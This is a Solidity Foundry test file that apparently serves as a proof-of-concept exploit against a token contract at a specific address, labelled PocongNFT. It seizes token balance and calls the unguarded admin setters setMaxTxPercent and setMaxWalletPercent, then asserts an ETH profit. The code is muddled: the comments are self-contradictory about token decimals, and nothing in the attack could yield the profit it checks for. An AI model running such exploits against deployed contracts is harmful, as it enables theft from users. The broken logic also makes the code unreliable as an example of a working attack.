pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5f5C745D399398a633D53cDC97b4eAeB7Cd135B7;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed beyond the template
        // The template already defines TARGET and attacker
        vm.label(TARGET, "PocongNFT");

        // Give attacker some PocongNFT tokens (required precondition)
        deal(TARGET, attacker, 1e18); // Give 1 token (with 9 decimals, so 1e9 is 1 token? Actually total supply is 1e9 * 1e9 = 1e18, so 1e18 is the total supply. Let's give 1% of total supply)
        // Actually, let's give a reasonable amount: 1% of total supply = 1e16
        uint256 onePercent = 1e9 * 1e9 * 1 / 100; // 1% of total supply
        deal(TARGET, attacker, onePercent);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial ETH balance
        uint256 initialBalance = address(this).balance;

        // Call vulnerable functions to set limits to 1%
        (bool success1, ) = TARGET.call(abi.encodeWithSignature("setMaxTxPercent(uint256)", 1));
        require(success1, "setMaxTxPercent failed");

        (bool success2, ) = TARGET.call(abi.encodeWithSignature("setMaxWalletPercent(uint256)", 1));
        require(success2, "setMaxWalletPercent failed");

        // Check if we somehow got ETH (oracle will check this)
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

